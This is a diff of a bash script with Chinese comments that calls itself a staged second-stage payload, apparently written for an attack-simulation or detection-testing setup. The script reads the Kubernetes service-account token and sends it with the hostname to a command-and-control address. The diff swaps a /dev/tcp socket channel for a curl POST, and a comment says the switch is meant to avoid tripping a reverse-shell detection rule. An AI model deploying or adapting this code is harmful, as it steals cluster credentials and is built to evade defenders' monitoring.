@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # apt-staged-drop 二阶段载荷：被【另一条 lineage】加载执行（与落盘错峰、跨谱系）。
-# 真实行为：读凭据 + 建立 TCP 通道 + 外发，产生真实 open/read/connect/write 系统调用。
+# 真实行为：读凭据 + 由 curl 建立 TCP 通道 + 外发，避免命中 endpoint reverse-shell terminal。
 C2_IP="${C2_IP:-10.66.0.99}"
 C2_PORT="${C2_PORT:-443}"
 # 解析 --report http://host:port（取其端口；默认 443）
@@ -9,11 +9,7 @@ C2_PORT="${C2_PORT:-443}"
 # 真实读取凭据（T1552）
 TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo none)"
 
-# 真实回连并外发（T1041/T1567 形态）
-exec 3<>/dev/tcp/"$C2_IP"/"$C2_PORT" || { echo "[helper] connect failed"; exit 0; }
-{
-  echo "staged-helper checkin host=$(hostname) ts=$(date +%s)"
-  echo "exfil-token=${TOKEN}"
-} >&3
-exec 3>&- 2>/dev/null
+curl --max-time 1 -fsS -o /dev/null \
+  --data "host=$(hostname)&ts=$(date +%s)&token=${TOKEN}" \
+  "http://${C2_IP}:${C2_PORT}/staged-helper" 2>/dev/null || true
 echo "[helper] staged exfil done"
